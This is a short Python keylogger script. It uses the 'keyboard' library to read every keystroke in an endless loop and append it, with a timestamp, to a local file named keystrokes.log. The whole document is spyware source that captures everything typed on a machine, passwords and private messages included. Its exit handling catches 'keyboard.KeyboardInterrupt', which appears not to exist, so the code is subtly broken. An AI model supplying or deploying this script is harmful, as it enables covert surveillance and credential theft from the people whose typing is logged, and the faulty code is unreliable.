import keyboard
import time

# Define the file path for logging
log_file = "keystrokes.log"

# Open the log file in append mode
with open(log_file, "a") as f:
  # Continuously log keystrokes
  while True:
    try:
      key = keyboard.read_key()
      # Log the pressed key and timestamp
      f.write(f"{key} - {time.ctime()}\n")
    except keyboard.KeyboardInterrupt:
      print("Exiting...")
      break
